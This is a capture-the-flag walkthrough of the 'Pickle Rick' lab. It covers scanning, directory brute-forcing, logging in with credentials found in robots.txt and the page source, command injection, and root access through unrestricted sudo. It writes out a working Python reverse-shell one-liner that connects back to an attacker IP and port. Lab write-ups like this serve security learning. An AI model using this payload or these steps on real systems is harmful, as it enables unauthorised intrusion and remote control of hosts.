![image](https://user-images.githubusercontent.com/87468669/195387786-e9ce2227-d5d6-49f6-bd37-d49d61f7a761.png)

First we start with an nmap scan 

```
# Nmap 7.92 scan initiated Wed Oct 12 10:43:01 2022 as: nmap -sC -sV -T4 -oN quickmap.txt -Pn 10.10.154.17
Nmap scan report for 10.10.154.17
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 55:7b:41:a6:7d:c5:62:13:c5:c2:af:8c:25:ae:24:b1 (RSA)
|   256 5c:c7:f0:af:79:69:38:f7:b0:94:00:6f:f2:de:5f:ba (ECDSA)
|_  256 e7:1b:43:9d:09:5d:17:e2:98:a9:a8:e7:e8:cf:9d:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 12 10:43:31 2022 -- 1 IP address (1 host up) scanned in 29.40 seconds
```

Nice we got http and ssh ports open, let's enumerate port 80. First we open the IP on our browser

![image](https://user-images.githubusercontent.com/87468669/195388802-f27a32cb-2da7-47c9-afbd-56e2a7f69dac.png)

nice we git the homepage and it's all about rick burping, asking us to logon to his computer to find the last 3 ingredients for him to change back from a pickle. Let's check source page 

![image](https://user-images.githubusercontent.com/87468669/195389823-e6676dee-3149-4c09-898d-62e9f52ba725.png)

cool we got a username: R1ckRul3s, let's burst hidden directories 

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/THM/PickleRick]
└─$ ffuf -u "http://10.10.154.17/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .txt,.php,.phtml -fc 403 -t 40

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.154.17/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .txt .php .phtml 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 1062, Words: 148, Lines: 38, Duration: 196ms]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 178ms]
denied.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 168ms]
index.html              [Status: 200, Size: 1062, Words: 148, Lines: 38, Duration: 153ms]
login.php               [Status: 200, Size: 882, Words: 89, Lines: 26, Duration: 161ms]
portal.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 168ms]
robots.txt              [Status: 200, Size: 17, Words: 1, Lines: 2, Duration: 158ms]
robots.txt              [Status: 200, Size: 17, Words: 1, Lines: 2, Duration: 167ms]
:: Progress: [18456/18456] :: Job [1/1] :: 250 req/sec :: Duration: [0:01:29] :: Errors: 0 ::
```

let's check robots.txt

![image](https://user-images.githubusercontent.com/87468669/195395528-35a21d4d-6263-46ec-beb8-e8b4c37b55f2.png)

we got a text "Wubbalubbadubdub" 🤔 that might be a potential password, let's check portal.php

![image](https://user-images.githubusercontent.com/87468669/195395867-4b0e8c63-7d7e-4fda-b3c6-8ac3814a1311.png)

we got redirected to a login.php page, why don't we try login with the username:R1ckRul3s and the potential password:Wubbalubbadubdub 

![image](https://user-images.githubusercontent.com/87468669/195396196-bf3c406b-2e03-4177-bb83-09050b83881b.png)

great we logged in, let's try gain shell. on the portal.php we have a command panel, let's test for command injection 

![image](https://user-images.githubusercontent.com/87468669/195396609-7a200103-6d27-4d0d-8d19-cfb082ae497c.png)

great we have a command injection. let's put our reverse shell payload.

Reverse shell payload ready

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.12.222",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

ncat listner ready 

![image](https://user-images.githubusercontent.com/87468669/195397012-bbac32d7-ecea-4ad9-814d-93e83fa014b9.png)

let's inject our payload to the command panel.

![image](https://user-images.githubusercontent.com/87468669/195397185-e3af6ea8-c4db-4d4a-8483-cf949401cbf3.png)

check our ncat listener, boom we got shell

![image](https://user-images.githubusercontent.com/87468669/195398886-68c712ac-a7a3-49a3-8772-673aca49f5e0.png)

let's stabilize the shell

![image](https://user-images.githubusercontent.com/87468669/195399055-df8ae1a3-0d61-4345-b380-1b575dbb36e6.png)

let's escalate privs to root. By just trying `sudo -l` we got to see that User www-data may run (ALL) NOPASSWD: ALL as root without password on the box.

![image](https://user-images.githubusercontent.com/87468669/195399720-79f40ca2-bcf1-432d-85f7-1bf087b3aa22.png)

We are root!. let's locate the ingredients

```
root@ip-10-10-197-162:/var/www/html# cat Sup3rS3cretPickl3Ingred.txt 
[redacted]
root@ip-10-10-197-162:/var/www/html# 
root@ip-10-10-197-162:/var/www/html# 
root@ip-10-10-197-162:/var/www/html# cd /home/rick/
root@ip-10-10-197-162:/home/rick# 
root@ip-10-10-197-162:/home/rick# ls
second ingredients
root@ip-10-10-197-162:/home/rick# cat "second ingredients" 
[redacted]
root@ip-10-10-197-162:/home/rick# 
root@ip-10-10-197-162:/home/rick# cd /root/
root@ip-10-10-197-162:~# 
root@ip-10-10-197-162:~# ls
3rd.txt  snap
root@ip-10-10-197-162:~# cat 3rd.txt 
[redacted]
root@ip-10-10-197-162:~# 
root@ip-10-10-197-162:~# 

```

![image](https://user-images.githubusercontent.com/87468669/195400539-2f7e6bb3-78ac-47d5-a6dd-de491424e481.png)

We are done. hope you had fun😉
